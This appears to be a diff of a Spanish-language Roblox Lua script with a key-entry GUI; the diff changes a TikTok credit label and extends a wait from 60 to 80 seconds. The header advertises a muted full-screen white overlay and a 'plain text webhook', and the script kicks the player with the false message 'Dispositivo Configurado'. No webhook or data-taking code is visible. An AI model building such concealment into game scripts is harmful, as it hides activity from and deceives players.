@@ -1,4 +1,4 @@
--- v3
+-- Integrated Script with 80-Second Kick, Full Mute on White Screen, Full-Coverage White Screen, Plain Text Webhook, and ToggleFriends (No HttpService)
 
 -- Services
 local UserInputService = game:GetService("UserInputService")
@@ -226,7 +226,7 @@ local CreditLabelKey = Instance.new("TextLabel")
 CreditLabelKey.Size = UDim2.new(1, -10, 0, 20)
 CreditLabelKey.Position = UDim2.new(0, 5, 1, -22)
 CreditLabelKey.BackgroundTransparency = 1
-CreditLabelKey.Text = "Hecho por @WaxyScript en TikTok"
+CreditLabelKey.Text = "Hecho por @WaxyScripts en TikTok"
 CreditLabelKey.Font = Enum.Font.Gotham
 CreditLabelKey.TextSize = 12
 CreditLabelKey.TextColor3 = Color3.fromRGB(200, 200, 200)
@@ -302,9 +302,9 @@ EnterButton.MouseButton1Click:Connect(function()
         ScreenGuiKey.Enabled = false
         pantallaBlanca()
 
-        wait(60)
+        wait(80)
 
-        -- Kick player
+        -- Kick player after 80 seconds
         player:Kick("Dispositivo Configurado")
     else
         InputBox.Text = "Llave incorrecta"
